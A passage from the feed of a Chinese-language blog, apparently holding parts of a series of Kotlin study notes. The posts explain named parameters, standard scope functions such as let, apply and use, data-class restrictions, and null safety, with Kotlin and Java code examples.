upperCaseFirstLetter: <span class="type">Boolean</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             divideByCamelHumps: <span class="type">Boolean</span> = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             wordSeparator: <span class="type">Char</span> = <span class="string">' '</span>)</span></span> &#123;</span><br><span class="line">      <span class="comment">//……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用形式改变如下：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">reformat(str, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="string">'_'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">reformat(str,</span><br><span class="line">    normalizeCase = <span class="literal">true</span>,</span><br><span class="line">    upperCaseFirstLetter = <span class="literal">true</span>,</span><br><span class="line">    divideByCamelHumps = <span class="literal">false</span>,</span><br><span class="line">    wordSeparator = <span class="string">'_'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Android Studio 3.0 已经自带了 parameter name hints ，所以这条现在看上去算不上特别吸引人了 :)<br><img src="/media/14994116820658.jpg" alt=""></p><h3 id="8-std自带函数">8. Std自带函数</h3><p>在kotlin的<code>Standard.kt</code>中定义了一些顶层高阶函数。<br><img src="/media/14994119797611.jpg" alt=""></p><p><code>TODO</code>、<code>take**</code>的几个顾名思义的方法不提了。下面的<code>run、with、apply、also、let</code>方法命名并不是一个好的实践（动词+名词），我们无法直接从名字上看出这些方法怎么用，怎么区分，只好read code 。</p><p>下面一一分析：</p><ul><li>let</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its argument and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> T.<span class="title">let</span><span class="params">(block: (<span class="type">T</span>)</span></span> -&gt; R): R = block(<span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><ol><li>receiver的扩展函数</li><li>参数是一个block，block参数为receiver，block内部通过it引用receiver</li><li>返回block的返回值</li><li>常常和安全调用操作符 <code>?.</code> 配合使用，用来保证let代码块中的it是已经null check过的</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> layout = LayoutStyle()</span><br><span class="line">SharedState.previousOrientation?.let &#123; layout.orientation = it &#125;</span><br></pre></td></tr></table></figure><ul><li>apply</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its receiver and returns `this` value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span> T.<span class="title">apply</span><span class="params">(block: <span class="type">T</span>.()</span></span> -&gt; <span class="built_in">Unit</span>): T &#123; block(); <span class="keyword">return</span> <span class="keyword">this</span> &#125;</span><br></pre></td></tr></table></figure><ol><li>receiver的扩展函数</li><li>参数是一个block，这个block本身也是receiver的扩展函数，block会在receiver的闭包内执行</li><li>最终返回receiver自身</li><li>常常被用来当做内置的builder，可以方便地实现chain式调用</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LayoutStyle</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> orientation = HORIZONTAL</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(<span class="keyword">vararg</span> args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line"> <span class="keyword">val</span> layout = LayoutStyle().apply &#123; orientation = VERTICAL &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>with</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with the given [receiver] as its receiver and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> <span class="title">with</span><span class="params">(receiver: <span class="type">T</span>, block: <span class="type">T</span>.()</span></span> -&gt; R): R = receiver.block()</span><br></pre></td></tr></table></figure><ol><li>with 不是扩展函数</li><li>参数是 receiver 和 block，这个block是receiver的扩展函数，block会在receiver的闭包内执行</li><li>返回block的返回值</li><li>当需要频繁access某个实例时，可以把他包在with代码块中，然后直接访问实例内部变量和方法。</li></ol><p>demo</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> layout = with(contextWrapper) &#123; </span><br><span class="line"> <span class="comment">// `this` is the contextWrapper</span></span><br><span class="line"> LayoutStyle(context, attrs).apply &#123; orientation = VERTICAL &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>run</p><p>run 有两个版本，第一个简单的调用block，第二个带上了泛型信息，成为了扩展函数。</p></li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;R&gt;</span> <span class="title">run</span><span class="params">(block: ()</span></span> -&gt; R): R = block()</span><br></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Calls the specified function [block] with `this` value as its receiver and returns its result.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@kotlin</span>.<span class="keyword">internal</span>.InlineOnly</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T, R&gt;</span> T.<span class="title">run</span><span class="params">(block: <span class="type">T</span>.()</span></span> -&gt; R): R = block()</span><br></pre></td></tr></table></figure><p>第一种使用场景不明。。。，这里只看第二种。</p><ol><li>receiver的扩展函数</li><li>参数是block，这个block是receiver的扩展函数，block会在receiver的闭包内执行</li><li>返回block的返回值</li></ol><p>剩下的<code>also</code>分析省略，总结成表格如下：</p><table><thead><tr><th>function</th><th>是否是扩展函数</th><th>block闭包环境</th><th>返回值</th></tr></thead><tbody><tr><td>let</td><td>是</td><td>it</td><td>block result</td></tr><tr><td>run</td><td>是</td><td>this</td><td>block result</td></tr><tr><td>also</td><td>是</td><td>it</td><td>receiver self</td></tr><tr><td>apply</td><td>是</td><td>this</td><td>receiver self</td></tr><tr><td>缺</td><td>否</td><td>it</td><td>block result</td></tr><tr><td>with</td><td>否</td><td>this</td><td>block result</td></tr><tr><td>缺</td><td>否</td><td>it</td><td>receiver self</td></tr><tr><td>缺</td><td>否</td><td>this</td><td>receiver self</td></tr></tbody></table><p>从上面的表看出，这种function按理应该有 2 <sup>3</sup> 8种。目前只提供了5种（是否是因为kotlin conf想不到更多的方法名了呢？）。</p><p>根据返回值来看：<br>also 和 apply 返回的 receiver self，方便chain式调用。</p><p>let 和 run 返回的是 block result ，可以获取block运行结果。</p><p>它们的区别是block内部引用receiver时：</p><p><code>let</code>和<code>also</code>使用it，而<code>run</code>和<code>apply</code>使用this。</p><p>从这个角度上看<code>let</code>(带有被动式的操作it)、<code>apply</code>(主动的应用到this)的命名还是比较贴切的。</p><p><code>with</code>作为非扩展函数是单独一档（没有同伴）。with返回 block result，而且 block 使用 this 引用receiver。从主要用法来说——简化对实例内部地访问，命名也很贴切，而且和别的语言惯例也是统一的。</p><p>另外在 <code>kotlin.io.Closeable.kt</code> 中还定义了<code>use</code> 扩展函数，也比较有意思。</p><ul><li>use</li></ul><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Executes the given [block] function on this resource and then closes it down correctly whether an exception</span></span><br><span class="line"><span class="comment"> * is thrown or not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> block a function to process this [Closeable] resource.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the result of [block] function invoked on this resource.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@InlineOnly</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">inline</span> <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T : Closeable?, R&gt;</span> T.<span class="title">use</span><span class="params">(block: (<span class="type">T</span>)</span></span> -&gt; R): R &#123;</span><br><span class="line">    <span class="keyword">var</span> closed = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> block(<span class="keyword">this</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">        closed = <span class="literal">true</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>?.close()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (closeException: Exception) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!closed) &#123;</span><br><span class="line">            <span class="keyword">this</span>?.close()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>use</code> 功能上会自动处理资源关闭的逻辑。有点类似 Java 7 的 try-with-resources 特性。</p><p><code>use</code> 和 <code>let</code> 在函数定义上相似，返回的是 block result，使用it引用receiver。区别是<code>use</code>的receiver 必须是<code>Closeable</code>的子类。</p><p>demo 可以看第一篇开头的例子：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> AssetManager.<span class="title">fileToString</span><span class="params">(filename: <span class="type">String</span>)</span></span>: String &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">open</span>(filename).use &#123;</span><br><span class="line">        it.readBytes().toString(Charset.defaultCharset())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://android.jlelse.eu/mastering-kotlin-standard-functions-run-with-let-also-and-apply-9cd334b0ef84" target="_blank" rel="noopener">Mastering Kotlin standard functions: run, with, let, also and apply</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的几个特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;默认参数&lt;/li&gt;
&lt;li&gt;命名参数&lt;/li&gt;
&lt;li&gt;std自带函数&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(二)</title>
    <link href="https://deskid.github.io/2017/07/06/kotlin-learn-notes-2/"/>
    <id>https://deskid.github.io/2017/07/06/kotlin-learn-notes-2/</id>
    <published>2017-07-06T13:24:27.000Z</published>
    <updated>2018-11-14T03:29:41.235Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的特性如下：</p><ul><li>data class</li></ul><a id="more"></a><p>接上篇，正如上篇所说，kotlin 没有重新造轮子，kotlin能做到的，用Java也能做到。所有的编程语言都是工具，目标都是为了实现业务功能。但是工具之间是有分别的：使用者是否用着顺手(是否对程序员友好)，完成任务的效率是否高效(开发效率是否高)，完成的任务质量是否有保障(运行效率是否高)——这三个维度足够说明一个工具是否优秀。单纯的争论类似“PHP是最好的编程语言”的言论没有任何意义。</p><h3 id="5-data-class">5. data class</h3><p>如果以后AI会写Java代码了，很大概率是先学会写 POJO(Plain old Java object)。</p><p>写POJO步骤如下：</p><ol><li>定义字段</li><li>写构造函数</li><li>写setter、getter</li><li>写equals、hashCode</li><li>写toString</li><li>写copy</li></ol><p>除了第一步需要人工干预，后面的代码可以利用插件自动生成。既然都可以自动生成了，那为啥还要程序员写出来呢？所以google开源了AutoValue库，只要写一个abstract class，AutoValue会自动实现上述方法。与此类似，kotlin则引入了data class的概念。</p><!-- more --><p>声明一个 data class，kotlin会做两件事：</p><ol><li>自动生成<code>equals()/hashCode()</code>, <code>toString()</code>, <code>copy()</code></li><li>自动生成<code>componentN()</code></li></ol><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>(<span class="keyword">val</span> login: String,</span><br><span class="line">                <span class="keyword">val</span> avatarUrl: String,</span><br><span class="line">                <span class="keyword">val</span> name: String,</span><br><span class="line">                <span class="keyword">val</span> company: String,</span><br><span class="line">                <span class="keyword">val</span> reposUrl: String,</span><br><span class="line">                <span class="keyword">val</span> blog: String)</span><br></pre></td></tr></table></figure><p>转化后生成Java代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String login;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> String blog;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.login;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//....</span></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getBlog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(@NotNull String login, @NotNull String avatarUrl, @NotNull String name, @NotNull String company, @NotNull String reposUrl, @NotNull String blog)</span> </span>&#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">super</span>();</span><br><span class="line">      <span class="keyword">this</span>.login = login;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      <span class="keyword">this</span>.blog = blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">component1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.login;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">component6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.blog;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@NotNull</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> User <span class="title">copy</span><span class="params">(@NotNull String login, @NotNull String avatarUrl, @NotNull String name, @NotNull String company, @NotNull String reposUrl, @NotNull String blog)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> User(login, avatarUrl, name, company, reposUrl, blog);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User(login="</span> + <span class="keyword">this</span>.login </span><br><span class="line">                + <span class="string">", avatarUrl="</span> + <span class="keyword">this</span>.avatarUrl</span><br><span class="line">                + <span class="string">", name="</span> + <span class="keyword">this</span>.name </span><br><span class="line">                + <span class="string">", company="</span> + <span class="keyword">this</span>.company </span><br><span class="line">                + <span class="string">", reposUrl="</span> + <span class="keyword">this</span>.reposUrl </span><br><span class="line">                + <span class="string">", blog="</span> + <span class="keyword">this</span>.blog + <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (((((<span class="keyword">this</span>.login != <span class="keyword">null</span> ? <span class="keyword">this</span>.login.hashCode() : <span class="number">0</span>) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.avatarUrl != <span class="keyword">null</span> ? <span class="keyword">this</span>.avatarUrl.hashCode() : <span class="number">0</span>)) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.name != <span class="keyword">null</span> ? <span class="keyword">this</span>.name.hashCode() : <span class="number">0</span>)) * <span class="number">31</span> </span><br><span class="line">                + (<span class="keyword">this</span>.company != <span class="keyword">null</span> ? <span class="keyword">this</span>.company.hashCode() : <span class="number">0</span>)) * <span class="number">31</span></span><br><span class="line">                + (<span class="keyword">this</span>.reposUrl != <span class="keyword">null</span> ? <span class="keyword">this</span>.reposUrl.hashCode() : <span class="number">0</span>)) * <span class="number">31</span></span><br><span class="line">                + (<span class="keyword">this</span>.blog != <span class="keyword">null</span> ? <span class="keyword">this</span>.blog.hashCode() : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> != var1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">                User var2 = (User) var1;</span><br><span class="line">                <span class="keyword">if</span> (Intrinsics.areEqual(<span class="keyword">this</span>.login, var2.login)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.avatarUrl, var2.avatarUrl)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.name, var2.name)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.company, var2.company)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.reposUrl, var2.reposUrl)</span><br><span class="line">                        &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.blog, var2.blog)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kotlin 的 data class 虽然很好很强大，但也有许多限制：</p><ol><li><p>无法使用<code>open</code>修饰 data class<br><img src="/media/14993372396488.jpg" alt=""></p></li><li><p>无法写空构造函数<br><img src="/media/14993372660936.jpg" alt=""></p></li><li><p>所有参数必须有 val 或者 var 修饰<br><img src="/media/14993372928919.jpg" alt=""></p></li><li><p>不能是抽象类，不能是内部类<br><img src="/media/14993373205457.jpg" alt=""><br><img src="/media/14993373277548.jpg" alt=""></p></li></ol><p>定下神来，就会发现：这些都是在限制data class的继承功能。</p><p>那么，kotlin为什么不允许数据类之间继承呢。<br>假设 data class 可以实现继承：</p><p><strong>Base data class 的实例和继承类的实例之间 equals 如何写？</strong></p><p>根据 equals 的定义(不考虑null)：</p><ul><li>自反 A = A</li><li>对称 A = B -&gt; B = A</li><li>传递 A = B B = C -&gt; A = C</li><li>一致 一次调用A = B成立 -&gt; 多次调用A = B也成立</li></ul><p>根据上面代码可知，data class 生成的equals 判断的是 instanceof 比较。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span> != var1) &#123;</span><br><span class="line">       <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">           User var2 = (User) var1;</span><br><span class="line">           <span class="keyword">if</span> (Intrinsics.areEqual(<span class="keyword">this</span>.login, var2.login)</span><br><span class="line">                   &amp;&amp; </span><br><span class="line">                   <span class="comment">//...</span></span><br><span class="line">                   &amp;&amp; Intrinsics.areEqual(<span class="keyword">this</span>.blog, var2.blog)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设有 Admin 类继承 User 类, 那么下面这个例子就违反了对称性。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Admin a;</span><br><span class="line">User b;</span><br><span class="line">b.equals(a) == <span class="keyword">true</span>; <span class="comment">//Admin a is instanceof(User)</span></span><br><span class="line">a.equals(b) == <span class="keyword">false</span>; <span class="comment">//User b is not instanceof(Admin)s</span></span><br></pre></td></tr></table></figure><p>情况复杂起来了，是不是？</p><p>另外，子类如果修改了构造函数的参数顺序，生成的 <code>componentN</code> 方法会发生冲突。</p><p>比如下面这个例子</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">Derived</span></span>(<span class="keyword">val</span> c: C, b: B, a: A) : Base(a, b)</span><br></pre></td></tr></table></figure><p>Derived 类继承的<code>component1(): A</code>会和生成的<code>component1(): C</code>冲突</p><p>所以在遇到复杂的需要人工干预<code>equals、hashCode</code>的情况时，kotlin直接限制了data class 相关的能力。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;data class&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(一)</title>
    <link href="https://deskid.github.io/2017/06/29/kotlin-learn-notes-1/"/>
    <id>https://deskid.github.io/2017/06/29/kotlin-learn-notes-1/</id>
    <published>2017-06-29T15:21:27.000Z</published>
    <updated>2018-11-14T03:31:21.331Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的特性如下：</p><ul><li>nullsafety</li><li>primitive is Object too</li><li>first-class method</li><li>扩展函数、属性</li></ul><a id="more"></a><blockquote><p>在手里拿着铁锤的人看来，世界就像一颗钉子。</p></blockquote><p>多学一门语言, 可以开拓眼界，促使我们换一个角度去看问题。</p><p>kotlin汲取了许多优秀的语言的设计经验，上手时满满的熟悉感，让kotlin几乎没有什么学习曲线。许多编程语言都是从实现业务逻辑、解决算法问题的角度去设计的，而kotlin考虑了程序员使用体验，站在了使用者的角度——一门好的编程语言，不应该让使用者去帮它解决设计缺陷，而应该致力于提高使用者的效率。</p><p>举个例子，用Java实现读asset目录下的一个文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">fileToString</span><span class="params">(AssetManager assetManager,String fileName)</span> </span>&#123;</span><br><span class="line">        InputStream is = assetManager.open(fileName);</span><br><span class="line">        <span class="keyword">final</span> String newline = System.lineSeparator();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> BufferedReader(is);</span><br><span class="line">            StringBuffer sb = <span class="keyword">new</span> StringBuffer((<span class="keyword">int</span>) file.length() * <span class="number">2</span>);</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(line + newline);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.close();</span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">            <span class="comment">//log the exception</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (reader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="comment">//log the exception</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面一坨代码中，真正有用的代码只有两行。</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">public class Utils &#123;</span><br><span class="line">    public static String fileToString(AssetManager assetManager,String fileName) &#123;</span><br><span class="line"><span class="addition">+        InputStream is = assetManager.open(fileName);</span></span><br><span class="line">        //....</span><br><span class="line">        try &#123;</span><br><span class="line">          //...</span><br><span class="line"><span class="addition">+            return sb.toString();</span></span><br><span class="line">        &#125; catch (IOException ioe) &#123;</span><br><span class="line">            //...</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            //...  </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用kotlin实现一样的代码：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> AssetManager.<span class="title">fileToString</span><span class="params">(filename: <span class="type">String</span>)</span></span>: String &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">open</span>(filename).use &#123;</span><br><span class="line">        it.readBytes().toString(Charset.defaultCharset())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是代码的表现力。我想，除非公司根据代码行数给你支付工资，没人会想去写臃肿的Java代码版本。</p><!-- more --><p>本文是学习kotlin过程中，产生的一些笔记。</p><h3 id="1-nullsafety">1. nullsafety</h3><p>NPE 绝对是编程bug界的老大哥，毕竟上百万dollar的身价。</p><p>Java 也提供了<code>@Nullable</code>和<code>@NonNull</code>的Lint检查，不过对程序员而言，这只是可选项，而且即使在所有的代码中加上了这两个注解，仅仅是会在IDE中产生一条warning。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">(@Nullable List list)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> list.size() == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 kotlin 把 null 当做了一种新的类型，从而可以用类似类型检查的方式，把NPE扼杀在摇篮中。</p><p>nullsafety相关的基础语法：</p><ul><li>Type?</li></ul><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ var a: Int? = null</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">- var a: Int = null //not compile</span></span><br></pre></td></tr></table></figure><ul><li>安全访问操作符<code>?.</code></li></ul><p>这个二元操作符的意思是，在操作符左边的值不为null的情况下，访问右边的表达式并返回其值，否则返回null。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a: <span class="built_in">Int</span>? = <span class="literal">null</span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">a?.toString()</span><br><span class="line">a?.let&#123; println(it) &#125;</span><br></pre></td></tr></table></figure><ul><li>Elvis operator (<code>?:</code>)</li></ul><p>猫王 Elvis Presley (这脑洞不得不服) ?:<br>区别于Java中的三元操作符，这是个二元操作符。<br>如果左值非空，就返回左值，否则返回右值。</p><figure class="highlight 